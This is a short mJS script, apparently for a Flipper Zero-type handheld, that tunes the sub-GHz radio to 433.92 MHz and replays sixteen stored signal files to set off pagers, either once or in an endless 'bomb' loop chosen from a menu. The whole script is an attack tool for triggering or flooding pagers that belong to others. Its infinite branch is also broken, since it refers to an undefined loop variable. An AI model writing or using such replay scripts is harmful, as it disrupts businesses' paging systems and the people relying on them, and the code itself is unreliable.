// Import subghz mJS library
let subghz = require("subghz");
subghz.setup();

function changeFrequency(freq) {
    if (subghz.getState() !== "IDLE") {
        subghz.setIdle(); // need to be idle to change frequency
    }
    subghz.setFrequency(freq);
}
// Set to idle
subghz.setIdle();
// change frequency to correct range of pagers
changeFrequency(433920000);

let submenu = require("submenu");
submenu.addItem("Bomb once", 0);
submenu.addItem("Bomb infinitly", 1);
submenu.setHeader("Select an option:");
let result = submenu.show();

function bombPagers(choice) {
    if (choice === 0) {
        // 1/2 sec delay
        delay(500);

        // print pagers 1-16 bombing them 1 time
        for (let i = 1; i <= 16; i++) {
            print("Sending P"+i+".sub")
            subghz.transmitFile("/ext/subghz/P"+i+".sub");      
        }

        print("Send success");

        // close subghz 
        subghz.end()
    }
    else {
        // 1/2 sec delay
        delay(500);

        // print pagers 1-16 infinitly bombing them
        while (1) {
            print("Sending P"+i+".sub")
            subghz.transmitFile("/ext/subghz/P"+i+".sub");      
        }

        print("Send success");

        // close subghz 
        subghz.end()
    }
}

bombPagers(result);
